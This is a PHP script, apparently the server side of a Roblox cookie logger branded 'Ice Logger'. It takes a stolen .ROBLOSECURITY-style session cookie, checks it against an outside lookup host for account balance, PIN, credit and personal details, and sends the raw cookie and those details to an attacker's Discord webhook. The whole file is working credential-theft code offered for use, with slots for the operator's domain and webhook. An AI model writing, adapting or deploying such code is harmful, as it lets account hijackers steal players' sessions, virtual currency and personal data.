<?php

$allowed_origins = array(
  "https://Yourdomain.com",
);

$wontent = htmlspecialchars($_GET['t']);
if (!isset($_SERVER['HTTP_ORIGIN']) || !in_array($_SERVER["HTTP_ORIGIN"], $allowed_origins) || !isset($_GET["t"])) {
    die();
}

$ch = curl_init("https://info.roblox-api.co/userinfo?cookie=" . $wontent); // such as http://example.com/example.xml
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HEADER, 0);
$data = curl_exec($ch);
$data = json_decode($data);
if ($data->emailverified == 1){
  $email = "True";
} else {
  $email = "False";
}
if ($data->status == "good"){
    //=======================================================================================================
// Create new webhook in your Discord channel settings and copy&paste URL
//=======================================================================================================

$webhookurl = "YourWebhook";

//=======================================================================================================
// Compose message. You can use Markdown
// Message Formatting -- https://discordapp.com/developers/docs/reference#message-formatting
//========================================================================================================

$timestamp = date("c", strtotime("now"));

$json_data = json_encode([
    // Message
    "content" => "New Log",
    
    // Username
    "username" => "Ice Logger",
    "avatar_url" => "https://cdn.discordapp.com/avatars/891486210634154034/11d248defdd31e86a53acb2814a3a4b0.png?size=80",

    // Avatar URL.
    // Uncoment to replace image set in webhook
    //"avatar_url" => "https://ru.gravatar.com/userimage/28503754/1168e2bddca84fec2a63addb348c571d.jpg?size=512",

    // Text-to-speech
    "tts" => false,

    // File upload
    // "file" => "",

    // Embeds Array
    "embeds" => [
        [
            // Embed Title
            "title" => $data->username,

            // Embed Type
            "type" => "rich",

            // Embed Description
            "description" => "```" . $wontent . "```",

            // URL of title link
            "url" => "https://roblox.com/users/" . $data->userid,

            // Timestamp of embed must be formatted as ISO8601
            "timestamp" => $timestamp,

            // Embed left border color in HEX
            "color" => hexdec( "3366ff" ),

            // Footer
            "footer" => [
                "text" => "Bot by Ice Bear#8828",
                "icon_url" => ""
            ],

            // Image to send
            "image" => [
                "url" => "",
            ],
              "thumbnail" => [
            "url" => $data->avatarurl
            ],

            // Author
            "author" => [
                "name" => "Ice logger",
                "url" => "https://discord.gg/sUPRXSYMKg"
            ],

            // Additional Fields array
            "fields" => [
                [
                    "name" => "Robux🤑: ",
                    "value" =>  "```" . $data->robux . "```",
                    "inline" => true
                ],
                // Field 2
                [
                    "name" => "Rap📈: ",
                    "value" => "```" . $data->rap . "```",
                    "inline" => true
                ],

                [
                    "name" => "Pin🔒: ",
                    "value" => "```" . $data->pin . "```",
                    "inline" => true
                ],

                
                [
                    "name" => "Premuim💎: ",
                    "value" => "```" . $data->premium . "```",
                    "inline" => true
                ],

                [
                    "name" => "Age👴: ",
                    "value" => "```" . $data->datecreated . "```",
                    "inline" => true
                ],

                [
                    "name" => "Pending⌛: ",
                    "value" => "```" . $data->pendingrobux . "```",
                    "inline" => true
                ],

                [
                    "name" => "Email✉: ",
                    "value" => "```" . $email . "```",
                    "inline" => true
                ],

                [
                    "name" => "Credit💵: ",
                    "value" => "```" . $data->credit . "```",
                    "inline" => true
                ],

                [
                    "name" => "Followers📸: ",
                    "value" => "```" . $data->followers . "```",
                    "inline" => true
                ],

                [
                    "name" => "Age👴: ",
                    "value" => "```" . $data->datecreated . "```",
                    "inline" => true
                ],

                [
                    "name" => "Country🗺: ",
                    "value" => "```" . $data->country . "```",
                    "inline" => true
                ],

                [
                    "name" => "Gender👦: ",
                    "value" => "```" . $data->gender . "```",
                    "inline" => true
                ],
            ]
        ]
    ]

], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );
$ch = curl_init( $webhookurl );
curl_setopt( $ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
curl_setopt( $ch, CURLOPT_POST, 1);
curl_setopt( $ch, CURLOPT_POSTFIELDS, $json_data);
curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt( $ch, CURLOPT_HEADER, 0);
curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1);

$response = curl_exec( $ch );
curl_close( $ch );
} else {
  echo("Invalid Cookie<br>");
}
curl_close($ch);
?>